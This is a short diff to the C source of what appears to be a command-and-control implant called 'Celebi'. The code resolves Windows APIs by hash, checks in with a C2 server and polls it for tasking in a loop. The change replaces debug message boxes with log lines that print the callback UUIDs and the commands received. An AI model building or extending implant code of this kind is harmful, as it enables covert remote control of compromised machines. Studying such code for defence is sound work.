@@ -15,8 +15,6 @@ WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWO
 WINBASEAPI size_t MSVCRT$strlen(const char *str);
 WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
 
-WINBASEAPI int WINAPI USER32$MessageBoxA (HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
-
 FARPROC resolve(DWORD modHash, DWORD funcHash) {
 	HANDLE hModule = findModuleByHash(modHash);
 	return findFunctionByHash(hModule, funcHash);
@@ -94,19 +92,22 @@ void go() {
 	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
 		free_params(&params);
 		free_checkin_reply(&checkin_reply);
-		USER32$MessageBoxA(NULL, "Checkin failed :(", "Celebi", MB_OKCANCEL);
+		dprintf("Checkin failed with: %s", checkin_reply.status);
 		return;
 	}
 	
-	USER32$MessageBoxA(NULL, "Successful Checkin!", "Celebi", MB_OKCANCEL);
 	params.callback_uuid = checkin_reply.callback_uuid;
+	dprintf("Successful checkin with payload UUID %s and callback UUID %s", params.payload_uuid, params.callback_uuid);
 	
 	while (1) {
 		// Look ma, no masking!
 		TaskingReply tasking_reply = { 0 };
 		perform_tasking(&params, &tasking_reply, http);
 		
-		USER32$MessageBoxA(NULL, "Received commands from C2!", "Celebi", MB_OKCANCEL);
+		dprintf("Received tasking from C2 server!");
+		for (int i = 0; i < tasking_reply.tasking_size; i++) {
+			dprintf("COMMAND %s: %s %s", tasking_reply.tasks[i].id, tasking_reply.tasks[i].command, tasking_reply.tasks[i].parameters);
+		}
 		
 		free_tasking_reply(&tasking_reply);
 		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
